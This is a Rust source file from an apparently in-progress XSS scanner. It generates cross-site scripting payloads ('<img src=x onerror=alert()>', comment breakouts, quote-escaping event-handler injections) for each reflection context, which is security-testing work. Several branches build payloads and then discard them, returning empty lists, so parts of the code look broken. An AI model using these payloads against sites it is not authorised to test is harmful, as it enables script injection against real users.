#[path = "parser.rs"]
mod parser;
use crate::scan::xss::parser::Location;
use fancy_regex::Regex;

pub struct XssPayloads {
    pub js_cmd: Vec<String>,
    pub js_value: Vec<String>,
    pub html_tags: Vec<String>,
}

#[derive(Debug)]
pub struct OrderPayload {
    pub search: String,
    pub payload: String,
}

pub fn match_qoutes(d: &str, s: &str) -> bool {
    let re = Regex::new(&format!(r#"=\'.*{}*.\'"#, s)).unwrap();
    re.is_match(d).unwrap_or(false)
}

pub fn match_double_qoutes(d: &str, s: &str) -> bool {
    // regex: "(?:[^"\\\\]|\\\\.)*khaled(?:[^"\\\\]|\\\\.)*"
    let re = Regex::new(&format!(r#"=\".*{}*.\""#, s)).unwrap();
    re.is_match(d).unwrap_or(false)
}

pub struct PayloadGen<'a> {
    pub location: &'a Location,
    pub response: &'a str,
    pub payload: &'a str,
    pub payloads: &'a XssPayloads,
}

impl<'a> PayloadGen<'a> {
    pub fn new(
        response: &'a str,
        location: &'a Location,
        payload: &'a str,
        payloads: &'a XssPayloads,
    ) -> Self {
        PayloadGen {
            location,
            response,
            payloads,
            payload,
        }
    }

    pub fn get_attr(&self, word: &str) -> Vec<String> {
        let attrs = vec![
            "onerror",
            "onload",
            "oncopy",
            "onmouseover",
            "onmouseenter",
            "onmouseleave",
            "onmouseout",
            "onmousemove",
            "onmousedown",
            "onmouseup",
            "onclick",
            "ondblclick",
            "oncontextmenu",
            "onkeydown",
            "onkeypress",
            "onkeyup",
        ];
        let mut payloads = Vec::new();
        for words in attrs.iter() {
            if words.starts_with(word) {
                payloads.push(words.to_string());
            }
        }
        payloads
    }
    pub fn analyze(&self) -> Vec<OrderPayload> {
        match *self.location {
            Location::Text(ref text) => {
                vec!["<img src=x onerror=alert()>".to_string()];
                vec![]
            }
            Location::TagName(ref tag_name) => {
                let tag_without_payload = tag_name.replace(self.payload, "");
                if tag_without_payload.len() == 0 {
                    vec!["img/onerror=alert()".to_string()];
                    vec![]
                } else {
                    vec![format!(
                        "kokimg/{:?}",
                        self.get_attr(tag_without_payload.as_str())
                    )];
                    vec![]
                }
            }

            Location::Comment(ref comment) => {
                vec!["--><img src=x onload=alert()>".to_string()];
                vec![]
            }

            Location::AttrName(ref attr_name) => {
                /*
                 * Just match the attribute name
                 * */
                let tag_without_payload = attr_name.replace("hackerman", "");
                self.get_attr(tag_without_payload.as_str())
                    .into_iter()
                    .map(|x| {
                        format!(
                            "{}=alert() f",
                            x.replace("hackerman", "")
                                .replace(tag_without_payload.as_str(), "")
                        )
                    })
                    .collect::<Vec<String>>();
                vec![]
            }

            Location::AttrValue(ref attr_value) => {
                // match if attr_value is a js command
                let payloads = {
                    let mut new_payloads = vec![];
                    self.payloads.js_cmd.iter().for_each(|y| {
                        self.payloads.js_value.iter().for_each(|z| {
                            new_payloads.push(format!("{}({})", y, z));
                        })
                    });
                    new_payloads
                };
                // add more " after one loop
                let attrs = vec!["onerror", "onload"];
                let mut found: Vec<OrderPayload> = Vec::new();
                payloads.iter().for_each(|js_cmd| {
                    attrs.iter().for_each(|attr_pay| {
                        let double = match_double_qoutes(self.response, attr_value.as_str());
                        let single = match_qoutes(self.response, attr_value.as_str());
                        if single || double {
                            for i in 0..5 {
                                found.push(OrderPayload {
                                    payload: format!(
                                        "{}{}={} g",
                                        {
                                            if double {
                                                "\"".repeat(i)
                                            } else {
                                                "'".repeat(i)
                                            }
                                        },
                                        attr_pay,
                                        js_cmd
                                    ),
                                    search: format!(
                                        "*[{}='{}']",
                                        attr_pay,
                                        js_cmd.replace("\"", "\\\"").replace("'", "\\\"")
                                    ),
                                });
                            }
                        } else {
                            found.push(OrderPayload {
                                payload: format!(" {}={} g", attr_pay, js_cmd),
                                search: format!(
                                    "*[{}='{}']",
                                    attr_pay,
                                    js_cmd.replace("\"", "\\\"").replace("'", "\\\"")
                                ),
                            });
                        }
                    })
                });
                found
            }
        }
    }
}
